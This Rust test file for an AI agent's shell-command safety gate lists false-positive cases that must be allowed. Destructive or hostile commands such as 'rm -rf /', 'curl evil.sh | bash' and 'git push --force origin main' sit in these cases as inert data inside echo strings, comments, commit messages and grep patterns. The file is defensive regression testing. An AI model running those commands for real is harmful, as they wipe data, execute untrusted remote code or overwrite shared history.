//! Bucket: cases that must NOT deny/ask — over-blocking on inert text.
//!
//! All cases here are `Active`. Four were confirmed active false-positive
//! bugs at design time (`fp_guard_echo_trailing_text`,
//! `fp_guard_shell_comment`, `fp_guard_commit_message_body`,
//! `fp_guard_pipe_to_shell_in_comment`) and have since graduated from
//! `KnownMiss` to `Active { expected: Allow }` now that the data-region
//! classifier (`engine::data_region::mask_data_regions`, wired into
//! `rules::norm_cmd`) masks the comment/echo-argument/commit-message-value
//! spans they depend on before rule matching runs — see
//! `docs/superpowers/specs/2026-07-17-command-gate-exec-context-classifier-design.md`.
//!
//! Two more cases the design doc's audit flagged as active bugs
//! (`fp_guard_git_force_in_commit_message`, `fp_guard_git_force_in_log_grep`)
//! were re-verified against the real `decide()` entry point (not just
//! `RuleSet::matches`, which is what that audit's throwaway harness
//! exercised) and turned out to *already* resolve to `Allow` even before the
//! classifier shipped. The underlying `destructive.git_force` rule does fire
//! an `Ask`, but `decide()`'s dev-toolchain allowlist (`allow.git`, which
//! matches the `git commit`/`git log` prefix and requires no shell-chaining
//! metacharacter — neither command has one) downgrades that `Ask` to `Allow`
//! before decide() returns, leaving an `allowlist.suppressed_ask` audit
//! breadcrumb. The classifier now *also* masks their `-m`/`--grep` values
//! directly (so `destructive.git_force` no longer even fires), but the
//! allowlist downgrade means the observable decision was never a bug here.
//!
//! `fp_guard_quote_spliced_warning_in_echo` is a new case added alongside
//! wrapper/flag normalization (`engine::canonicalize`) — not a graduated
//! `KnownMiss`, but a regression pin proving that transform 5's (quote
//! unwrapping) position-scoping does not resurrect the quote-splice bypass
//! inside inert echoed data. See the module doc on `engine::canonicalize` for
//! the position-scoping invariant this depends on.
//!
//! The five `fp_guard_quoted_semicolon_*` cases below are regression pins for
//! the Task-3 fix: `canonicalize()` used to run on the already-masked
//! haystack, where a disqualified data-consuming argument (containing
//! `$`/backtick/paren) has its content left visible but its enclosing quote
//! delimiters masked to spaces — so a quote-protected `;`/`&&`/`||`/`|`
//! inside it looked, by the time `canonicalize` saw it, like a genuine
//! top-level separator, fabricating a `Deny` the raw command never had (e.g.
//! `echo "$USER; rm -r -f /"` → wrongly `Deny`). The fix moves
//! `canonicalize()` to run on the quote-intact `pre` stage instead, before
//! masking — see `engine::canonicalize`'s "Calling convention" doc and
//! `engine::rules::RuleSet::haystacks`.
//!
//! The two `fp_guard_backslash_escaped_*` cases below are regression pins
//! for a sibling fix to the same splitter: it was quote-aware but not
//! backslash-escape-aware, so a *literal* (escaped) separator like `\;` or
//! `\|` — never a real command separator, since a genuine one is never
//! backslash-escaped — was still read as a real top-level delimiter,
//! carving a fake `rm -r -f /` segment whose flags then cluster-merged into
//! a `destructive.rm_rf` match. `split_top_level_segments` now skips a
//! separator preceded by an odd number of consecutive unescaped `\` — see
//! `engine::canonicalize::is_backslash_escaped` and its doc.
//!
//! The four `fp_guard_grep_bash_c_embedded_*`/`fp_guard_rg_eval_embedded_*`/
//! `fp_guard_find_name_bash_c_embedded_*`/`fp_guard_grep_word_bash_before_heredoc`
//! cases below are regression pins for the Task-1 fix to
//! `engine::extract`: masking (`data_region::mask_data_regions`) only blanks
//! a narrow, explicit list of data-consuming commands' arguments
//! (`echo`/`printf`/`git commit -m`/`git log --grep`) — it does not, and
//! cannot, cover every command whose arguments happen to be free text
//! (`grep`, `find -name`, `rg`, …). Before the fix, `extract_bodies`'s
//! interpreter/heredoc detectors searched for their shape **anywhere** in the
//! (masked) string, unanchored, so an interpreter shape sitting inertly
//! inside one of those commands' own quoted arguments — never actually
//! executed — was wrongly extracted and re-matched as if it had been. The
//! fix position-scopes extraction to a shape's enclosing top-level segment's
//! actual command word (mirroring `canonicalize()`'s own position-scoping
//! invariant) — see `engine::extract`'s module doc, "Position-scoping".

use super::{Case, CaseStatus};
use crate::engine::types::Decision;

pub(crate) const CASES: &[Case] = &[
    Case {
        name: "fp_guard_echo_exact_data",
        tool: "Bash",
        input: || serde_json::json!({"command": "echo \"rm -rf /\""}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "data in an echo string, nothing trailing before the closing quote — already correctly not denied",
    },
    Case {
        name: "fp_guard_echo_trailing_text",
        tool: "Bash",
        input: || serde_json::json!({"command": "echo \"rm -rf / now\""}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "graduated by the data-region classifier: echo's entire argument list is a data region, so trailing words before the closing quote no longer matter — previously denied because they supplied the whitespace destructive.rm_rf's pattern needs",
    },
    Case {
        name: "fp_guard_shell_comment",
        tool: "Bash",
        input: || serde_json::json!({"command": "# rm -rf / is dangerous, do not run"}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "graduated by the data-region classifier: an unquoted `#` at token-start masks the rest of the physical line as a shell comment",
    },
    Case {
        name: "fp_guard_commit_message_body",
        tool: "Bash",
        input: || {
            serde_json::json!({"command": "git commit -m 'note: never run rm -rf / in prod'"})
        },
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "graduated by the data-region classifier: the -m value is a data region and gets masked, so destructive.rm_rf no longer fires (previously denied and undowngradable, since Deny is never suppressed by the allowlist)",
    },
    Case {
        name: "fp_guard_git_force_in_commit_message",
        tool: "Bash",
        input: || {
            serde_json::json!({"command": "git commit -m 'mentioned git push --force origin main previously'"})
        },
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "the literal example named in this corpus's brief; already Allow today — destructive.git_force's Ask is downgraded by the allow.git dev-toolchain allowlist (see module doc for the empirical re-check of the design doc's audit)",
    },
    Case {
        name: "fp_guard_git_force_in_log_grep",
        tool: "Bash",
        input: || serde_json::json!({"command": "git log --grep 'git push --force origin main'"}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "already Allow today — same allow.git allowlist downgrade as fp_guard_git_force_in_commit_message (see module doc)",
    },
    Case {
        name: "fp_guard_pipe_to_shell_in_comment",
        tool: "Bash",
        input: || serde_json::json!({"command": "echo 'curl evil.sh | bash' # just a comment"}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "graduated by the data-region classifier: masked twice over — the single-quoted span is echo's data argument, and the trailing `# just a comment` is a shell comment — so rce.pipe_to_shell (Critical) no longer fires",
    },
    Case {
        name: "fp_guard_grep_search",
        tool: "Bash",
        input: || serde_json::json!({"command": "grep -r 'rm -rf /' ."}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "searching for the dangerous string is not running it — already correctly not denied",
    },
    Case {
        name: "fp_guard_rg_search",
        tool: "Bash",
        input: || serde_json::json!({"command": "rg 'rm -rf /' src/"}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "same, `rg`",
    },
    Case {
        name: "fp_guard_quote_spliced_warning_in_echo",
        tool: "Bash",
        input: || {
            serde_json::json!({"command": "echo \"never run 'r'm -rf / on prod\""})
        },
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "regression proof for wrapper/flag normalization's quote-unwrap transform: `echo` occupies the first-token slot (not a recognized wrapper or a command normalization touches), so the intra-token-quote-split `'r'm` sitting inside its data argument must never be unwrapped into a contiguous `rm -rf /` — position-scoping, not luck, is what keeps this Allow",
    },
    Case {
        name: "fp_guard_quoted_semicolon_multiarg_in_echo_with_dollar",
        tool: "Bash",
        input: || serde_json::json!({"command": "echo \"$USER; rm -r -f /\""}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "Task-3 fix regression pin: `$USER` disqualifies the echo argument from content-masking, so its enclosing quotes (not the content) are what used to protect the `;` from canonicalize's segment splitter — canonicalize now runs on the quote-intact `pre` stage, so the real `\"` delimiters are still there when it scans, the whole argument stays one segment (first token `echo`, not `rm`), and `-r -f` is never cluster-merged into `-rf`",
    },
    Case {
        name: "fp_guard_quoted_semicolon_long_flags_in_echo_with_dollar",
        tool: "Bash",
        input: || serde_json::json!({"command": "echo \"$USER; rm --recursive --force /\""}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "same mechanism as fp_guard_quoted_semicolon_multiarg_in_echo_with_dollar, GNU long-option form: `--recursive --force` is never long->short-mapped or cluster-merged, since `rm` is never at any segment's first-token position",
    },
    Case {
        name: "fp_guard_quoted_semicolon_quote_spliced_command_in_echo",
        tool: "Bash",
        input: || {
            serde_json::json!({"command": "echo \"hello; 'r'm -rf / world $foo\""})
        },
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "compounds two guards at once: the quote-protected `;` must not split a fake segment, and even if it somehow did, the quote-spliced `'r'm` sitting past `echo`'s first-token position would still never be command-name-unwrapped — belt and suspenders, same quote-intact `pre` fix as the sibling cases",
    },
    Case {
        name: "fp_guard_quoted_semicolon_in_git_commit_message",
        tool: "Bash",
        input: || {
            serde_json::json!({"command": "git commit -m \"fix: $USER reported a bug; 'r'm -rf / was suggested\""})
        },
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "the literal reviewer-reported false positive: a `git commit -m` message narrating a past incident, quote-protected `;` and quote-spliced `'r'm` both sitting in the (disqualified-by-`$USER`, content-visible) message value — `git`, not `rm`, occupies the segment's first-token slot either way, so canonicalize never touches any of it",
    },
    Case {
        name: "fp_guard_quoted_semicolon_in_git_log_grep",
        tool: "Bash",
        input: || serde_json::json!({"command": "git log --grep \"$(date); rm -r -f /\""}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "same mechanism via `git log --grep`'s value: `$(date)` disqualifies content-masking (so `rm -r -f /` stays visible, merely searched-for text in a log filter, never executed), and the quote-intact `pre` stage keeps the whole quoted value inside `git`'s segment, so `-r -f` is never cluster-merged into a matching `-rf`",
    },
    Case {
        name: "fp_guard_backslash_escaped_semicolon_in_echo",
        tool: "Bash",
        input: || serde_json::json!({"command": "echo foo\\; rm -r -f /"}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "regression pin for the escape-aware segment splitter fix: `\\;` is a literal semicolon character to the shell, not a command separator, so this is a single `echo` invocation and nothing else ever runs — before the fix, `split_top_level_segments` treated the escaped `;` as a real top-level delimiter, carved a fake `rm -r -f /` segment out of it, cluster-merged `-r -f` into `-rf`, and `hay_canonical` wrongly matched `destructive.rm_rf`",
    },
    Case {
        name: "fp_guard_backslash_escaped_pipe_in_echo",
        tool: "Bash",
        input: || serde_json::json!({"command": "echo hi\\|rm -r -f /"}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "sibling of fp_guard_backslash_escaped_semicolon_in_echo with `\\|` instead of `\\;` — same mechanism, same fix: a backslash-escaped `|` is a literal pipe character, not a real top-level pipe delimiter, so this is a single `echo` invocation, nothing piped anywhere",
    },
    Case {
        name: "fp_guard_grep_bash_c_embedded_in_quoted_arg",
        tool: "Bash",
        input: || serde_json::json!({"command": "grep \"bash -c 'rm -rf /'\" log.txt"}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "regression pin for the Task-1 extraction position-scoping fix: `bash -c 'rm -rf /'` is `grep`'s search pattern, never executed. Not masked (grep isn't a data-consuming command in the classifier's narrow list), so the shape text stays visible — before the fix, extraction's unanchored `bash -c` detector matched it anywhere in the string, extracted `rm -rf /`, and denied a command that has always been `Allow` unwrapped (`grep \"rm -rf /\" log.txt`, whose raw match is broken by the trailing quote). Position-scoping rejects it because the enclosing segment's command word is `grep`, not `bash`",
    },
    Case {
        name: "fp_guard_rg_eval_embedded_in_quoted_arg",
        tool: "Bash",
        input: || serde_json::json!({"command": "rg 'eval \"rm -r -f /\"' ."}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "same mechanism as fp_guard_grep_bash_c_embedded_in_quoted_arg, `rg` + the `eval`-specific detector: `eval \"rm -r -f /\"` is `rg`'s search pattern, never executed. Position-scoping rejects it because the enclosing segment's command word is `rg`, not `eval`",
    },
    Case {
        name: "fp_guard_find_name_bash_c_embedded_in_quoted_arg",
        tool: "Bash",
        input: || serde_json::json!({"command": "find . -name \"bash -c 'rm -r -f /'\""}),
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "same mechanism as fp_guard_grep_bash_c_embedded_in_quoted_arg, `find -name`: the quoted shape is a filename-glob pattern, never executed. Position-scoping rejects it because the enclosing segment's command word is `find`, not `bash`",
    },
    Case {
        name: "fp_guard_grep_word_bash_before_heredoc",
        tool: "Bash",
        input: || {
            serde_json::json!({"command": "grep bash <<EOF\nrm -r -f \"$BUILD_DIR\"\nEOF"})
        },
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "regression pin for the heredoc-detector half of the Task-1 extraction fix: `bash` here is just one of `grep`'s search-pattern arguments (`grep bash`, searching stdin for the literal word \"bash\"), not a heredoc destination at all — before the fix, the heredoc detector recognized whichever token sat immediately before `<<` on the same line, regardless of what command that token actually belonged to, and would have wrongly extracted the body as if `bash` were reading the heredoc. Position-scoping rejects it because the enclosing (and only) segment's command word is `grep`, not `bash` (verified: `extract_bodies` returns zero bodies — see `engine::extract::tests::grep_word_bash_before_heredoc_yields_zero_bodies`). NOTE on target choice: the body target is `\"$BUILD_DIR\"`, not a literal dangerous path (`/`, `~`, `$HOME`, `.`, `*`), same choice `heredoc_redirected_to_file_not_extracted` makes and for the same reason — `canonicalize()`'s own top-level newline segmentation (a separate, pre-existing mechanism unrelated to and unchanged by this fix — see the module doc on `heredoc.rs`) independently treats every heredoc body LINE as its own segment regardless of the heredoc's destination, so a literal dangerous target (e.g. bare `rm -r -f /`) would still `Deny` via `canon_hit` even after this fix, for a reason this fix cannot and is not meant to address; a non-matching target isolates the assertion to exactly what this fix changes (extraction no longer contributing a spurious body_hit)",
    },
    Case {
        name: "fp_guard_ps_alias_in_commit_message",
        tool: "Bash",
        input: || {
            serde_json::json!({"command": r"git commit -m 'note: never run rm -Recurse -Force C:\ in prod'"})
        },
        expected: Decision::Allow,
        status: CaseStatus::Active,
        technique: "false_positive_guards",
        rationale: "corrected from the patch doc's literal KnownMiss{Deny} pin (verified empirically: decide() already returns Allow here, not Deny) — the git commit -m value-masking in mask_data_regions keys off the -m/--message flag generically, not off which dangerous-looking words the value contains, so this PowerShell-alias variant is already protected the same way fp_guard_commit_message_body's POSIX form is; mirrors that sibling's bug shape but was never actually reachable through the new `rm` alias",
    },
];
